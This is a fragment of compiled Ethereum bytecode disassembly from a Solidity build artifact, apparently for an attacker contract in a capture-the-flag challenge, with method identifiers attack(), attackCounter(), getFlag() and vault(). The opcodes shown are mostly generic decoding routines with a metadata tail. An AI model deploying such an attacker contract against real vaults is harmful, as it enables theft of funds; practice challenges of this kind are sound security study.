JUMPDEST JUMPDEST DUP1 PUSH1 0x40 MSTORE POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0xB2A PUSH2 0x8E2 JUMP JUMPDEST SWAP1 POP PUSH2 0xB36 DUP3 DUP3 PUSH2 0xAEF JUMP JUMPDEST SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH8 0xFFFFFFFFFFFFFFFF DUP3 GT ISZERO PUSH2 0xB56 JUMPI PUSH2 0xB55 PUSH2 0xAC0 JUMP JUMPDEST JUMPDEST PUSH2 0xB5F DUP3 PUSH2 0x7AA JUMP JUMPDEST SWAP1 POP PUSH1 0x20 DUP2 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0xB7F PUSH2 0xB7A DUP5 PUSH2 0xB3B JUMP JUMPDEST PUSH2 0xB20 JUMP JUMPDEST SWAP1 POP DUP3 DUP2 MSTORE PUSH1 0x20 DUP2 ADD DUP5 DUP5 DUP5 ADD GT ISZERO PUSH2 0xB9B JUMPI PUSH2 0xB9A PUSH2 0xABB JUMP JUMPDEST JUMPDEST PUSH2 0xBA6 DUP5 DUP3 DUP6 PUSH2 0x780 JUMP JUMPDEST POP SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP3 PUSH1 0x1F DUP4 ADD SLT PUSH2 0xBC3 JUMPI PUSH2 0xBC2 PUSH2 0xAB6 JUMP JUMPDEST JUMPDEST DUP2 MLOAD PUSH2 0xBD3 DUP5 DUP3 PUSH1 0x20 DUP7 ADD PUSH2 0xB6C JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0xBF2 JUMPI PUSH2 0xBF1 PUSH2 0x8EC JUMP JUMPDEST JUMPDEST PUSH1 0x0 DUP3 ADD MLOAD PUSH8 0xFFFFFFFFFFFFFFFF DUP2 GT ISZERO PUSH2 0xC10 JUMPI PUSH2 0xC0F PUSH2 0x8F1 JUMP JUMPDEST JUMPDEST PUSH2 0xC1C DUP5 DUP3 DUP6 ADD PUSH2 0xBAE JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 EQ SELFBALANCE DUP6 EXTCODECOPY CALLER SELFDESTRUCT 0xA5 0x1E 0x2B SWAP8 SWAP7 PUSH24 0x43283852D637485A8E6F1D27C764920CE81DB13264736F6C PUSH4 0x43000814 STOP CALLER "},"methodIdentifiers":{"attack()":"9e5faafc","attackCounter()":"2631a7c6","getFlag()":"f9633930","vault()":"fbfa77cf"}}}}}